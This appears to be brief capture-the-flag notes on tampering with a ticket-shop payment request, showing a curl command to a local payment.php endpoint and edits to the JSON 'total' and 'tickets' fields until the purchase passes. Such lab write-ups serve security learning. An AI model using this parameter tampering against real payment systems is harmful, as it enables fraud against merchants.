curl 'http://localhost:2050/payment.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://localhost:2050/' -H 'Content-Type: application/json' -H 'Origin: http://localhost:2050' -H 'Connection: keep-alive' --data '{"total":1500,"tickets":{"0":5},"billing":{"first_name":"eqqn","last_name":"eqqn","email":"grehack@f.tw"}}'

I select the most expensive benefactor ticket

We get Error 400 - Bad request

the data being sent
{"total":1500,"tickets":{"0":5},"billing":{"first_name":"eqqn","last_name":"eqqn","email":"grehack@f.tw"}}

the 1500 probably corresponds to price, so can we go lower?
Lets say... 69?
Still insufficient funds. "0":5 looks interesting, perhaps it is checking the funds


If we send tickets "1":1, which could be the amount of tickets we "bought", or balance, it passes

{"total":1500,"tickets":{"1":1},"billing":{"first_name":"eqqn","last_name":"eqqn","email":"grehack@f.tw"}}
